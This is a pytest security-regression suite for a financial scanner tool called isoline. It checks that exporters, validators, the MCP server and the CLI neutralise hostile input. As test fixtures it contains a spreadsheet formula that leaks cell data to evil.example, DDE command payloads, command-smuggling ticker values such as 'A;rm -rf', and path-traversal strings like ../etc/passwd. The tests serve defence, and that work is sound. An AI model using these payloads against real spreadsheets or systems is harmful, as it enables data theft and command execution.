"""Security regressions: formula injection, input validation, URL allow-list, website CSP."""

from __future__ import annotations

import base64
import csv
import hashlib
import io
import re
from pathlib import Path
from unittest.mock import patch

import openpyxl
import pytest

from isoline.core.validation import (
    InvalidInputError,
    bounded_number,
    validate_sector,
    validate_ticker,
)
from isoline.exporters._safe import cell_safe, harden_workbook, safe_csv_writer
from tests.test_scores import company

EVIL = '=HYPERLINK("http://evil.example/?x="&A1,"click")'


# ----------------------------------------------------------------- formula injection
@pytest.mark.parametrize("raw", [EVIL, "+cmd|' /C calc'!A0", "-2+3+cmd|' /C calc'!A0", "@SUM(1+1)*cmd", "\t=1", "＝1+1"])
def test_formula_like_text_is_neutralised(raw: str) -> None:
    assert cell_safe(raw) == "'" + raw


@pytest.mark.parametrize("raw", ["-3.3%", "+12.5%", "-1,234.50", "1e-5", "-0.5", "Apple Inc.", "", "n/a"])
def test_numbers_and_plain_text_are_untouched(raw: str) -> None:
    assert cell_safe(raw) == raw


def test_non_strings_pass_through() -> None:
    assert cell_safe(-3.5) == -3.5 and cell_safe(None) is None and cell_safe(7) == 7


def test_safe_csv_writer_round_trip() -> None:
    buf = io.StringIO()
    safe_csv_writer(buf).writerow(["Company", EVIL, -1.5, "-1.5"])
    row = next(csv.reader(io.StringIO(buf.getvalue())))
    assert row == ["Company", "'" + EVIL, "-1.5", "-1.5"]


def test_harden_workbook_keeps_own_references_only() -> None:
    wb = openpyxl.Workbook()
    ws = wb.active
    ws["A1"] = "=Summary!B3"
    ws["A2"] = "=Growth!B2*100"
    ws["A3"] = EVIL
    ws["A4"] = "=1+1"
    assert harden_workbook(wb) == 2
    assert ws["A1"].data_type == "f" and ws["A2"].data_type == "f"
    assert ws["A3"].data_type == "s" and ws["A3"].value == "'" + EVIL
    assert ws["A4"].data_type == "s"


def _evil_fin(ticker: str) -> dict:
    fin = company()
    fin["info"] = {"symbol": ticker, "longName": EVIL, "exchange": "=cmd|' /C calc'!A0", "marketCap": 3000.0}
    return fin


def test_excel_export_contains_no_foreign_formulas(tmp_path: Path) -> None:
    from isoline.core.scanner import IsolineScanner
    from isoline.exporters.excel import ExcelExporter

    with patch("isoline.core.scanner.load_financials", side_effect=_evil_fin):
        result = IsolineScanner().scan("EVIL")
    out = tmp_path / "evil.xlsx"
    ExcelExporter().export(result, str(out))
    wb = openpyxl.load_workbook(out)
    own = re.compile(r"=[A-Za-z][A-Za-z ]{0,30}![A-Z]{1,3}[1-9][0-9]{0,6}(\*100)?")
    formulas = [c.value for ws in wb.worksheets for row in ws.iter_rows() for c in row if c.data_type == "f"]
    assert formulas and all(own.fullmatch(f) for f in formulas)
    texts = [c.value for ws in wb.worksheets for row in ws.iter_rows() for c in row if isinstance(c.value, str)]
    assert "'" + EVIL in texts


def test_cli_csv_export_neutralises_provider_text(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from typer.testing import CliRunner

    from isoline.cli.app import app

    monkeypatch.chdir(tmp_path)
    with patch("isoline.core.scanner.load_financials", side_effect=_evil_fin):
        res = CliRunner().invoke(app, ["scan", "EVIL", "--export", "out.csv", "--no-report", "--no-open"])
    assert res.exit_code == 0, res.output
    cells = [c for row in csv.reader(open(tmp_path / "out.csv", encoding="utf-8")) for c in row]
    assert "'" + EVIL in cells
    assert not any(c.startswith(("=", "@", "\t")) for c in cells)


# ----------------------------------------------------------------- input validation
@pytest.mark.parametrize("ok", ["AAPL", "INFY.NS", "BRK-B", "^GSPC", "EURUSD=X", "Tata Motors", "M&M.NS"])
def test_valid_tickers(ok: str) -> None:
    assert validate_ticker(f"  {ok} ") == ok


@pytest.mark.parametrize("bad", ["", "../etc/passwd", "a/b", "A;rm -rf", "<script>", "x" * 41, "AAPL\nMSFT", 42, None])
def test_invalid_tickers(bad: object) -> None:
    with pytest.raises(InvalidInputError):
        validate_ticker(bad)


def test_sector_and_number_bounds() -> None:
    assert validate_sector(None) == "IT" and validate_sector(" Banking ") == "Banking"
    with pytest.raises(InvalidInputError):
        validate_sector("IT; DROP")
    assert bounded_number("7", "x", 0, 9, 0) == 7.0 and bounded_number(None, "x", 0, 9, 3) == 3
    for bad in ("nan", "inf", 10, -1, True, "abc", [1]):
        with pytest.raises(InvalidInputError):
            bounded_number(bad, "x", 0, 9, 0)


def test_mcp_rejects_malicious_arguments() -> None:
    pytest.importorskip("mcp")
    import asyncio

    from isoline.mcp.server import handle_tool_call

    def call(name: str, args: object) -> None:
        asyncio.run(handle_tool_call(name, args))  # type: ignore[arg-type]

    with pytest.raises(ValueError):
        call("scan", {"ticker": "../../etc/passwd"})
    with pytest.raises(ValueError):
        call("scan", {"ticker": ["AAPL"]})
    with pytest.raises(ValueError):
        call("scan_ticker", {"ticker": "INFY", "exchange": {"x": 1}})
    with pytest.raises(ValueError):
        call("compare", {"ticker_a": "AAPL", "ticker_b": "<img src=x>"})
    with pytest.raises(ValueError):
        call("screen", {"sector": "IT", "min_piotroski": "nan"})
    with pytest.raises(ValueError):
        call("screen", {"sector": "IT", "max_de": 1e9})
    with pytest.raises(ValueError):
        call("scan", ["not", "an", "object"])


def test_cli_rejects_path_like_ticker() -> None:
    from typer.testing import CliRunner

    from isoline.cli.app import app

    res = CliRunner().invoke(app, ["scan", "../../secret"])
    assert res.exit_code == 2 and "not a valid ticker" in res.output


# ----------------------------------------------------------------- network
def test_edgar_refuses_non_sec_urls() -> None:
    from isoline.core import edgar
    from isoline.core.errors import ProviderUnavailableError

    for url in ("file:///etc/passwd", "http://www.sec.gov/x", "https://evil.example/https://www.sec.gov/"):
        with pytest.raises(ProviderUnavailableError, match="non-SEC"):
            edgar._get_json(url)


# ----------------------------------------------------------------- website
def test_website_csp_hashes_match_inline_scripts() -> None:
    """Editing an inline script without re-running .github/scripts/website_csp.py breaks the site."""
    page = (Path(__file__).parents[1] / "website" / "index.html").read_text(encoding="utf-8")
    csp = re.search(r'<meta http-equiv="Content-Security-Policy" content="([^"]+)">', page)
    assert csp, "website has no CSP"
    policy = csp.group(1)
    assert "default-src 'none'" in policy and "'unsafe-eval'" not in policy
    script_src = re.search(r"script-src ([^;]+)", policy)
    assert script_src and "'unsafe-inline'" not in script_src.group(1)
    for body in re.findall(r"<script>(.*?)</script>", page, flags=re.S):
        digest = base64.b64encode(hashlib.sha256(body.encode("utf-8")).digest()).decode()
        assert f"'sha256-{digest}'" in policy
    assert "<script src=" not in page, "no external scripts on the website"


def test_reports_open_by_absolute_file_uri(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    import webbrowser

    from isoline.cli.app import _open_report

    opened: list[str] = []
    monkeypatch.setattr(webbrowser, "open", lambda url: opened.append(url))
    monkeypatch.chdir(tmp_path)
    _open_report("r.html")
    assert opened == [(tmp_path / "r.html").resolve().as_uri()]

    def boom(_url: str) -> None:
        raise RuntimeError("no browser")

    monkeypatch.setattr(webbrowser, "open", boom)
    _open_report("r.html")  # a missing browser never fails the command


def test_screen_validates_bounds_and_can_skip_reports(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    import webbrowser

    from typer.testing import CliRunner

    from isoline.cli.app import app

    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(webbrowser, "open", lambda url: pytest.fail("browser opened"))
    runner = CliRunner()
    assert runner.invoke(app, ["screen", "IT", "--min-piotroski", "12"]).exit_code == 2
    assert runner.invoke(app, ["screen", "IT; rm"]).exit_code == 2
    with patch("isoline.core.scanner.load_financials", side_effect=lambda t: {**company(), "info": {"symbol": t}}):
        res = runner.invoke(app, ["screen", "IT", "--min-piotroski", "0", "--max-de", "100", "--no-open"])
    assert res.exit_code == 0, res.output
    html = (tmp_path / "screen_dashboard.html").read_text(encoding="utf-8")
    assert "Piotroski F at least 0" in html
